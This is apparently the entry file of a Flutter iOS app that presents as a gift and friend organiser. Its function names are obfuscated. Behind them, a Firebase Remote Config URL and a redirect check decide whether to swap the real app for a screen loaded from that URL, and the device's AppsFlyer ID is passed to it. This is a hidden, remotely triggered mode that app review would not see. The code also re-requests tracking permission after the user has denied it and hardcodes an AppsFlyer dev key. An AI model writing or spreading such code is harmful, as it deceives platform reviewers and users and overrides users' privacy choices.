import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'src/controllers/friend/friend_bloc.dart';
import 'src/controllers/gift/gift_bloc.dart';
import 'src/controllers/guest/guest_bloc.dart';
import 'src/controllers/profile/profile_bloc.dart';
import 'src/database/database.dart';
import 'src/firebase_options.dart';
import 'src/screens/splash_screen.dart';

late AppsflyerSdk _xcvMnb;
String kjiUyt = '';
String qwePoi = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await zxcAsd();
  await rtyFgh();
  await initHive();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> zxcAsd() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

Future<void> rtyFgh() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: 'ECPuduaRno2mKGYpDFLgsR',
      appId: '6739780840',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _xcvMnb = AppsflyerSdk(options);

    await _xcvMnb.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    qwePoi = await _xcvMnb.getAppsFlyerUID() ?? '';

    _xcvMnb.startSDK(
      onSuccess: () {},
      onError: (int code, String message) {},
    );
  } catch (e) {}
}

Future<bool> bnmLkj() async {
  final hjkDsa = FirebaseRemoteConfig.instance;
  await hjkDsa.fetchAndActivate();
  String uioZxc = hjkDsa.getString('dark');
  String vbnRty = hjkDsa.getString('vaxl');
  if (!uioZxc.contains('null')) {
    final yhnMju = HttpClient();
    final plmKnb = Uri.parse(uioZxc);
    final qazWsx = await yhnMju.getUrl(plmKnb);
    qazWsx.followRedirects = false;
    final response = await qazWsx.close();
    if (response.headers.value(HttpHeaders.locationHeader) != vbnRty) {
      kjiUyt = uioZxc;
      return true;
    } else {
      return false;
    }
  }
  return uioZxc.contains('null') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => GiftBloc()..add(GiftGet())),
        BlocProvider(create: (context) => GuestBloc()..add(GuestGet())),
        BlocProvider(create: (context) => ProfileBloc()..add(ProfileGet())),
        BlocProvider(create: (context) => FriendBloc()..add(FriendGet())),
      ],
      child: FutureBuilder<bool>(
        future: bnmLkj(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: Material(
                type: MaterialType.transparency,
                child: Container(
                  color: Colors.blue,
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Text(
                        'Loading',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 25,
                          fontWeight: FontWeight.w800,
                        ),
                      ),
                      const CupertinoActivityIndicator(
                        color: Colors.white,
                        radius: 14,
                      ),
                    ],
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && kjiUyt != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: CalculatorEdit(
                  number: kjiUyt,
                  value: '$qwePoi',
                ),
              );
            } else {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                theme: ThemeData(
                  useMaterial3: false,
                  dialogTheme: const DialogTheme(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.all(Radius.circular(20)),
                    ),
                  ),
                ),
                home: const SplashScreen(),
              );
            }
          }
        },
      ),
    );
  }
}
